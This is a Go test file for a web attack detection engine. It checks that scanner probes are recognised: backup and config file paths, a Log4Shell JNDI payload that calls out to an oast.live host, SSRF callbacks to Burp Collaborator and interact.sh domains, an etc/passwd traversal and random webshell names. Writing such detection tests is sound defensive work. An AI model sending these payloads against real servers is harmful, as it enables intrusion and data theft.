package detect

import (
	"fmt"
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/model"
)

// 生产环境 nuclei 扫描中没被识别的探测：备份文件的各种后缀、配置文件、根目录日志、以站点名命名的源码包、扫描器特征。
func TestScanProbesFromProduction(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for uri, rule := range map[string]string{
		"/backup_1.sql.xz":           "sens-backup",
		"/api.sql.lz":                "sens-backup",
		"/html.lz":                   "sens-backup",
		"/e/config/config.php.bkp":   "sens-srcbak",
		"/conn.php.original":         "sens-srcbak",
		"/includes/config.php.blank": "sens-srcbak",
		"/include/config.inc.php.2":  "sens-srcbak",
		"/environments/dev/common/config/main-local.php_bak": "sens-srcbak",
		"/main.php~":                 "sens-srcbak2",
		"/apache.conf":               "sens-cicd2",
		"/.github/workflows/ci.yaml": "sens-cicd",
		"/config/prod.json":          "sens-cicd2",
		"/wp-app.log":                "sens-log",
		"/app.jar":                   "sens-sitearchive",
		"/example.com.tar.gz":        "sens-sitearchive",
		"/app.example.com.zip":       "sens-sitearchive",
		"/nuclei.svg":                "scan-artifact",
		"/_search?a=${jndi:ldap://${:-330}.dblofn6cm7ob3fabf4sgr57praiedpztp.oast.live}": "scan-artifact",
		"/x?u=http://abc.burpcollaborator.net/":                                          "scan-artifact",
	} {
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.100", Host: "app.example.com", Method: "GET", URI: uri, Status: 200, Bytes: 477, UA: "Mozilla/5.0"}
		if _, ok := hitIDs(e.Inspect(ev))[rule]; !ok {
			t.Errorf("%s 应命中 %s：%v", uri, rule, ruleIDs(e.Inspect(ev)))
		}
	}
	// 正常请求不受影响
	for _, uri := range []string{"/static/js/app.2.js", "/download/report.php", "/api/v1.2/items", "/mg/index.html", "/blog/oast-tools-explained",
		"/assets/app.css", "/changelog", "/static/example.png", "/docs/nginx.conf.html"} {
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.101", Host: "app.example.com", Method: "GET", URI: uri, Status: 200, Bytes: 5000, UA: "Mozilla/5.0"}
		for _, h := range e.Inspect(ev) {
			if !h.TagOnly && h.Severity >= model.SevLow && h.Category != CatAutomation {
				t.Errorf("%s 不应命中: %+v", uri, h)
			}
		}
	}
	if siteArchive("10.0.0.5", "/10.0.0.5.zip") != "" || siteArchive("", "/app.zip") != "" {
		t.Error("没有域名时不判断站点源码包")
	}
}

// 兜底页面上的目录扫描：不存在的路径返回与首页相同大小的 200，按“未找到”计入目录扫描；
// 正常 App 用户访问大量接口（响应大小各不相同）与单页应用的少量深链接不算。
func TestSoftMissDirScan(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	t0 := time.Date(2026, 11, 5, 3, 30, 0, 0, time.UTC)
	web := func(ip, uri string, size int64, at time.Time) []model.Hit {
		return b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: ip, Host: "mg.example.com", Method: "GET", URI: uri, Status: 200, Bytes: size, Time: at})
	}
	for i := range 20 { // 首页（监控探活与访客）
		web(fmt.Sprintf("198.51.100.%d", i+1), "/", 477, t0.Add(time.Duration(i)*time.Second))
	}
	var hits []model.Hit
	for i := range 60 {
		hits = append(hits, web("203.0.113.54", fmt.Sprintf("/probe/%d.php", i), 477, t0.Add(time.Minute+time.Duration(i)*500*time.Millisecond))...)
	}
	if n, _ := countRule(hits, "bhv-dirscan"); n != 1 {
		t.Fatalf("兜底页面上的目录扫描应识别: %d", n)
	}
	// App 用户：60 个不同接口，响应大小各不相同
	hits = nil
	for i := range 60 {
		hits = append(hits, web("117.136.8.5", fmt.Sprintf("/api/item/%d", i), int64(500+i*13), t0.Add(time.Minute+time.Duration(i)*500*time.Millisecond))...)
	}
	// 单页应用：几个深链接返回首页
	for i, p := range []string{"/dashboard", "/orders", "/settings"} {
		hits = append(hits, web("117.136.8.6", p, 477, t0.Add(time.Minute+time.Duration(i)*time.Second))...)
	}
	if n, _ := countRule(hits, "bhv-dirscan"); n != 0 {
		t.Fatalf("正常访问不是目录扫描: %d", n)
	}
}

// 自动化漏洞扫描：同一来源短时间内带载荷的请求涉及 3 类以上攻击，按整段扫描识别，并认出工具。
func TestVulnScanSession(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	t0 := time.Date(2026, 11, 5, 3, 30, 0, 0, time.UTC)
	cats := []string{CatSQLi, CatXSS, CatTraversal, CatExpr}
	var hits []model.Hit
	for i := range 12 {
		rh := []model.Hit{{RuleID: "x", Category: cats[i%len(cats)], Severity: model.SevHigh}}
		if i == 3 {
			rh = append(rh, model.Hit{RuleID: "scan-artifact", Category: CatScanner, Severity: model.SevMedium, Evidence: "….oast.live}"})
		}
		hits = append(hits, b.ObserveHits(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.54", Host: "mg.example.com", Method: "GET",
			URI: fmt.Sprintf("/v%d?id=1", i), Status: 404, Time: t0.Add(time.Duration(i) * time.Second)}, rh)...)
	}
	var vs *model.Hit
	for i := range hits {
		if hits[i].RuleID == "bhv-vulnscan" {
			vs = &hits[i]
		}
	}
	if vs == nil || vs.Name != "自动化漏洞扫描（nuclei）" || vs.Category != CatScanner {
		t.Fatalf("应识别为自动化漏洞扫描并认出 nuclei: %+v", vs)
	}
	// 只命中一两类攻击（如反复提交同一种注入）不算整段扫描
	b2 := NewBehavior(th)
	hits = nil
	for i := range 20 {
		hits = append(hits, b2.ObserveHits(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.55", Method: "GET", URI: "/s?q=1", Status: 200,
			Time: t0.Add(time.Duration(i) * time.Second)}, []model.Hit{{RuleID: "x", Category: CatSQLi, Severity: model.SevHigh}})...)
	}
	if n, _ := countRule(hits, "bhv-vulnscan"); n != 0 {
		t.Fatalf("单一类型的攻击不是整段扫描: %d", n)
	}
}

// 第二批生产样本：备份后缀的更多变体、CI / 凭证配置、带外域名不带前导点、随机文件名脚本、编码绕过。
func TestScanProbesMoreVariants(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for uri, rule := range map[string]string{
		"/phpsso_server/caches/configs/database.php.disabled": "sens-srcbak",
		"/environments/prod/common/config/main-local.php.rej": "sens-srcbak",
		"/config/config_ucenter.php.txt":                      "sens-srcbak",
		"/include/config.inc.php!":                            "sens-srcbak2",
		"/data/common.inc.php.~":                              "sens-srcbak2",
		"/const.DB.php.bak!":                                  "sens-srcbak",
		"/wp-login.php.new":                                   "sens-srcbak",
		"/wp-config.2":                                        "sens-srcbak2",
		"/wwwroot.tar.z":                                      "sens-backup",
		"/bin.Z":                                              "sens-backup-name",
		"/data.tar":                                           "sens-backup-name",
		"/database/db.sqlite3":                                "sens-backup",
		"/backup_1.sqlitedb":                                  "sens-backup",
		"/gitlab-ci.yml":                                      "sens-cicd",
		"/.drone.yml":                                         "sens-cicd",
		"/sftp-config.json":                                   "sens-cicd2",
		"/app/config/pimcore/google-api-private-key.json":     "sens-cicd2",
		"/id_rsa_4096":                                        "sens-cicd",
		"/autodiscover/autodiscover.json?Protocol=ActiveSync&Email=lvAKSI%40oast.pro": "scan-artifact",
		"/vsaPres/Web20/core/LocalProxy.ashx?url=http://oast.me":                      "scan-artifact",
		"/%0A/interact.sh/": "scan-artifact",
		"/interlib/report/ShowImage?localPath=etc/passwd":                                                     "lfi-sensitive",
		"/test/S1WpC8G9WjvkbIPWhWWM.jsp":                                                                      "webshell-random",
		"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/3LehqWWL5NSHSMM3bMvu2LG1Iaf.jsp": "webshell-random",
		"/%77eb%75i_%77sma_Http":                                                                              "proto-escape",
	} {
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.102", Host: "app.example.com", Method: "GET", URI: uri, Status: 200, Bytes: 477, UA: "Mozilla/5.0"}
		if _, ok := hitIDs(e.Inspect(ev))[rule]; !ok {
			t.Errorf("%s 应命中 %s：%v", uri, rule, ruleIDs(e.Inspect(ev)))
		}
	}
	for _, uri := range []string{"/files/latest-release.zip", "/downloads/metadata.zip", "/user_profile_edit.php", "/AdminController.php",
		"/static/js/chunk-2f3a9c1b8e7d6f5a.js", "/api/v1/UserProfileService.aspx", "/search?q=%41%42%43", "/docs/%E4%B8%AD%E6%96%87.html"} {
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.103", Host: "app.example.com", Method: "GET", URI: uri, Status: 200, Bytes: 5000, UA: "Mozilla/5.0"}
		for _, h := range e.Inspect(ev) {
			if !h.TagOnly && h.Category != CatAutomation {
				t.Errorf("%s 不应命中: %+v", uri, h)
			}
		}
	}
}
